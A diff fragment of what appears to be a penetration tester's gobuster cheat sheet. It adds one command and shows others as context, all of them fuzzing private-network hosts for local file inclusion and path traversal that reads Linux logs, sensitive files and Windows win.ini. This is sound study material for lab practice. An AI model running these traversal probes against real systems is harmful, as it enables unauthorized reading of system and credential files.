@@ -3,7 +3,7 @@ gobuster fuzz -u "http://192.168.213.209/welcome.php?file=FUZZ" -w ~/wordlists/p
 
 gobuster fuzz -u "http://192.168.112.181/public/plugins/cloudwatch/../../../../../../../../../../../../../FUZZ" -w ~/wordlists/path-traversal/linuxLogsAll --proxy http://127.0.0.1:8080
 gobuster fuzz -u "http://192.168.112.181/public/plugins/cloudwatch/../../../../../../../../../../../../..FUZZ" -w ~/wordlists/path-traversal/linuxSensitiveFiles --proxy http://127.0.0.1:8080
-
+gobuster fuzz -u "http://192.168.197.99/FUZZWindows%2Fwin.ini" -w /home/kali/wordlists/path-traversal/BaseTraversalFileRaw --proxy http://127.0.0.1:5100
 -------------------------------------------------------------------------------------------
 ## dir flag - target files and directories
 ## -H flag - Custom Header 
